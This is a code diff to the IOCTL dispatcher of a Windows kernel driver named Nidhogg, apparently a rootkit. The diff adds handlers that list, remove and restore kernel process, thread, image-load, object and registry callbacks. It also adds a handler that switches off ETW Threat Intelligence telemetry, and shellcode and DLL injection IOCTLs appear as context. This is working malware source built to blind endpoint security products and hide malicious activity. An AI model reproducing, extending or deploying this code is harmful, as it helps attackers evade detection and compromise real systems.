@@ -32,9 +32,12 @@
 #define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-#define IOCTL_NIDHOGG_LIST_CALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1120,16 +1123,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
-	case IOCTL_NIDHOGG_LIST_CALLBACKS: 
+	case IOCTL_NIDHOGG_LIST_OBCALLBACKS: 
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(CallbacksList) != 0) {
+		if (size % sizeof(ObCallbacksList) != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = (CallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+		auto data = (ObCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
 
 		if (data->NumberOfCallbacks == 0 && data->Callbacks) {
 			status = STATUS_INVALID_PARAMETER;
@@ -1146,7 +1149,50 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_INVALID_PARAMETER;
 		}
 
-		len += sizeof(CallbacksList);
+		len += sizeof(ObCallbacksList);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_LIST_PSROUTINES:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(PsRoutinesList) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (PsRoutinesList*)Irp->AssociatedIrp.SystemBuffer;
+
+		switch (data->Type) {
+		case PsImageLoadType:
+		case PsCreateProcessTypeEx:
+		case PsCreateProcessType: 
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread: {
+			status = ListPsNotifyRoutines(data, NULL, NULL);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
+		}
+
+		len += sizeof(PsRoutinesList);
+		break;
+	}
+	case IOCTL_NIDHOGG_LIST_REGCALLBACKS:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(CmCallbacksList) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
+		status = ListRegistryCallbacks(data, NULL, NULL);
+
+		len += sizeof(CmCallbacksList);
 		break;
 	}
 
@@ -1167,14 +1213,23 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		switch (data->Type) {
+		case PsImageLoadType:
+		case PsCreateProcessType:
+		case PsCreateProcessTypeEx:
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread:
 		case ObProcessType:
-		case ObThreadType: {
-			status = RemoveObCallback(data);
+		case ObThreadType:
+		case CmRegistryType: {
+			status = RemoveCallback(data);
 			break;
 		}
 		default:
 			status = STATUS_INVALID_PARAMETER;
 		}
+
+		if (!NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Failed to remove callback (0x%08X)\n", status));
 
 		len += sizeof(KernelCallback);
 		break;
@@ -1197,16 +1252,56 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		switch (data->Type) {
+		case PsImageLoadType:
+		case PsCreateProcessType:
+		case PsCreateProcessTypeEx:
+		case PsCreateThreadType:
+		case PsCreateThreadTypeNonSystemThread:
 		case ObProcessType:
-		case ObThreadType: {
-			status = RestoreObCallback(data);
+		case ObThreadType: 
+		case CmRegistryType: {
+			status = RestoreCallback(data);
 			break;
 		}
 		default:
 			status = STATUS_INVALID_PARAMETER;
 		}
 
+		if (!NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Failed to restore callback (0x%08X)\n", status));
+
 		len += sizeof(KernelCallback);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI:
+	{
+		if (!Features.EtwTiTamper) {
+			KdPrint((DRIVER_PREFIX "Due to previous error, etwti tampering is unavaliable.\n"));
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(ULONG) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (*data != true && *data != false) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		status = EnableDisableEtwTI(*data);
+
+		if (!NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));
+
+		len += sizeof(ULONG);
 		break;
 	}
 
